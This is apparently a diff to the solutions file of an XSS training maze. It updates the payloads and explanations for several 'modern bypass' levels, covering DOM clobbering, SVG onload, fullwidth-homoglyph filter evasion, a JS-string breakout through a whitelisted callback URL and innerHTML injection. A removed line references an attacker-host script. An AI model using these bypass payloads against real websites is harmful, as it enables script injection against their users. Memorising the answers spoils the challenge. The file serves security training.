@@ -13,9 +13,9 @@ Modern real-world XSS bypasses: multi-step state, DOM clobbering config, Vue.js 
 
 ### modern-bypass-level2
 
-`/modern-bypass/level2/?query=%3Ca%20id=config%20href=%22data:text/javascript,alert(1)%22%3E`
+`/modern-bypass/level2/?query=%3Ca%20id=config%20href=data:text/javascript,alert(1)%3E%3C/a%3E`
 
-- payload: `<a id="config" href="data:text/javascript,alert(1)">`
+- payload: `<a id=config href=data:text/javascript,alert(1)></a>`
 - context: Standard tags/events stripped, but allowed anchor tag with custom id clobbers global `window.config` reference to load dynamic script.
 
 ### modern-bypass-level3
@@ -34,10 +34,10 @@ Modern real-world XSS bypasses: multi-step state, DOM clobbering config, Vue.js 
 
 ### modern-bypass-level5
 
-`/modern-bypass/level5/?svg=%3Csvg%20onload=alert(1)%3E`
+`/modern-bypass/level5/?svg=%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20onload=%22alert(1)%22/%3E`
 
-- payload: `<svg onload=alert(1)>`
-- context: Recursive case-insensitive `<script>` tag strip bypassed using raw element-level events on SVG under `image/svg+xml` content-type.
+- payload: `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>`
+- context: served as image/svg+xml, so the payload must be well-formed namespaced XML
 
 ### modern-bypass-level6
 
@@ -48,17 +48,17 @@ Modern real-world XSS bypasses: multi-step state, DOM clobbering config, Vue.js 
 
 ### modern-bypass-level7
 
-`/modern-bypass/level7/?query=%EF%BC%9C%EF%BD%93%EF%BD%83%EF%BD%92%EF%BD%89%EF%BD%90%EF%BD%94%EF%BC%9E`
+`/modern-bypass/level7/?query=%EF%BC%9C%EF%BD%89%EF%BD%8D%EF%BD%87%E3%80%80%EF%BD%93%EF%BD%92%EF%BD%83%EF%BC%9D%EF%BD%98%E3%80%80%EF%BD%8F%EF%BD%8E%EF%BD%85%EF%BD%92%EF%BD%92%EF%BD%8F%EF%BD%92%EF%BC%9D%EF%BD%81%EF%BD%8C%EF%BD%85%EF%BD%92%EF%BD%94%EF%BC%88%EF%BC%91%EF%BC%89%EF%BC%9E`
 
-- payload: `＜ｓｃｒｉｐｔ＞`
-- context: Strict keyword/event WAF bypassed using Unicode homoglyphs, which then normalize to standard tags via client-side `.normalize('NFKC')`.
+- payload: `＜ｉｍｇ　ｓｒｃ＝ｘ　ｏｎｅｒｒｏｒ＝ａｌｅｒｔ（１）＞`
+- context: fullwidth homoglyphs pass the keyword WAF and NFKC-normalise into markup before innerHTML
 
 ### modern-bypass-level8
 
-`/modern-bypass/level8/?callback_url=https://xssmaze.com.attacker.com/malicious.js`
+`/modern-bypass/level8/?callback_url=https://xssmaze.com'-alert(1)-'`
 
-- payload: `https://xssmaze.com.attacker.com/malicious.js`
-- context: Flawed domain regex whitelist prefix check lacks proper anchors/slashes, allowing attacker subdomains starting with whitelist domain.
+- payload: `https://xssmaze.com'-alert(1)-'`
+- context: whitelist prefix passes; the URL lands raw in a single-quoted JS string
 
 ### modern-bypass-level9
 
@@ -104,10 +104,10 @@ Modern real-world XSS bypasses: multi-step state, DOM clobbering config, Vue.js 
 
 ### modern-bypass-level15
 
-`/modern-bypass/level15/?query=%27%20onerror=%27alert(1)`
+`/modern-bypass/level15/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `' onerror='alert(1)`
-- context: Reflected inside single-quoted data-attribute JSON. Double quotes are escaped, but single quotes are not, allowing attribute breakout.
+- payload: `<img src=x onerror=alert(1)>`
+- context: the JSON name member reaches innerHTML; a quote-free payload needs no breakout
 
 ### modern-bypass-level16
 
